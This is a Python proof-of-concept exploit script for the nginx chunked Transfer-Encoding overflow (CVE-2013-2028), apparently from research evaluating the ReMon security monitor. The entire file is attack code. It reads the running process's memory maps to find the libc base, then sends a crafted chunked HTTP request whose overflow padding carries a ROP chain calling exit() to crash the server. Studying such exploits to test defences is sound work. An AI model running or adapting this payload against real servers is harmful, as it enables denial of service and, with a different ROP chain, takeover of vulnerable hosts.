#/!/usr/bin/env python

import os
import socket
import struct
import sys
import time

from roputils import *

# Based on http://www.vnsecurity.net/research/2013/05/21/analysis-of-nginx-cve-2013-2028.html

# Very simple proof of concept 'DoS' that just makes the ROP call exit().

#    python attack.py /lib/x86_64-linux-gnu/libc.so.6 /path/to/ReMon/nginx-1.8.0/objs/nginx
# or python attack.py /path/to/ReMon/patched_binaries/libc/amd64/libc.so.6 /path/to/ReMon/eurosys-use-case/nginx-1.8.0/objs/nginx

host = 'localhost'
port = 8888

def getpids():
	return [pid for pid in os.listdir('/proc') if pid.isdigit()]

def wait_for_process(name, sleep=100):
	while True:
		for pid in getpids(): # psutil.pids(): p = psutil.Process(pid) p.name() == name:
			try:
				if open("/proc/%s/comm" % pid).readlines()[0].startswith(name):
					return int(pid)
			except e:
				pass
		time.sleep(1000/sleep)

def exploit(sock, libc_rop):
	payload  = "GET / HTTP/1.1\r\n"
	payload += "Host: localhost\r\n"
	payload += "Accept: */*\r\n"
	payload += "Transfer-Encoding: chunked\r\n\r\n"
	payload += "f" * (1024-len(payload)-8) + "0f0f0f0f"
	payload += "A" * (4096+5*8)

	payload += libc_rop.p(libc_rop.addr("exit"))

	sock.sendall(payload)
	sock.close()

def get_load_for(lib, perms, maps):
	for load in maps[lib]:
		if load[1] == perms:
			return int(load[0], base=16)

def get_pid_maps(pid, cmd):
	maps = {}
	while cmd not in maps:
		for line in open("/proc/%i/maps" % pid):
			s = line.split(" ")
			range = s[0].split("-")
			name = s[-1].rstrip("\n")
			if name in maps:
				maps[name] += [(range[0], s[1])]
			else:
				maps[name] = [(range[0], s[1])]
				#time.sleep(0.5)
		return maps


if __name__ == "__main__":
	if len(sys.argv) != 3:
		print >>sys.stderr, "Usage: python exploit.py <path-to-libc.so> <path-to-nginx>"
		sys.exit(0)
	
	libc  = sys.argv[1]
	nginx = sys.argv[2]

	#pid = wait_for_process("nginx")
	pid = wait_for_process("MVEE_LD_Loader_")
	print pid

	m = get_pid_maps(pid, nginx)
	libc_base = get_load_for(libc, "r-xp", m)

	print "0x%x" % libc_base

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((host, port))

	libc_rop   = ROP(libc)
	libc_rop.set_base(libc_base)

	exploit(sock, libc_rop)

